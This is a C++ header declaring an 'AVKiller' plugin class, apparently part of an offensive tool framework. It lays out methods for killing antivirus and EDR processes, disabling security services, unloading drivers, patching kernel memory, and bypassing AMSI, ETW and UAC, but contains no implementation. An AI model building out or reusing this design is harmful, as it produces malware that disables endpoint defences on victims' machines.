#pragma once
#include <string>
#include <vector>

// Configuration structure for AV killing
struct AVKillerConfig {
    bool aggressiveMode;
    bool killProcesses;
    bool disableServices;
    bool unloadDrivers;
    bool patchMemory;
    bool targetSpecificAV;
};

// AV Killer Plugin Interface
class AVKiller {
private:
    AVKillerConfig config;

    // Utility functions
    std::vector<std::string> getRunningProcesses();
    bool killProcess(const std::string& processName);
    std::vector<std::string> getAVProcesses();
    std::vector<std::string> getAVServices();
    bool disableService(const std::string& serviceName);
    bool stopService(const std::string& serviceName);

    // Menu handlers
    void handleKillAVProcesses();
    void handleDisableAVServices();
    void handleUnloadAVDrivers();
    void handlePatchKernelMemory();
    void handleKillSpecificAV();
    void handleBypassAMSI();
    void handleBypassETW();
    void handleBypassUAC();
    void handleConfiguration();

public:
    AVKiller();
    ~AVKiller();

    // Plugin interface methods
    std::string getName() const;
    std::string getDescription() const;
    std::string getVersion() const;
    bool initialize();
    void execute();
    std::vector<std::string> getOptions() const;
    void setOption(const std::string& option, const std::string& value);

    // AV/EDR Killing Methods
    std::string killAVProcesses();
    std::string disableAVServices();
    std::string unloadAVDrivers();
    std::string patchKernelMemory();
    std::string killSpecificAV(const std::string& avName);
    std::string bypassAMSI();
    std::string bypassETW();
    std::string bypassUAC();

    // Configuration methods
    void setAggressiveMode(bool aggressive);
    void setKillProcesses(bool kill);
    void setDisableServices(bool disable);
    void setUnloadDrivers(bool unload);
    void setPatchMemory(bool patch);
    void setTargetSpecificAV(bool target);

    // Menu interface
    void showMenu();
};
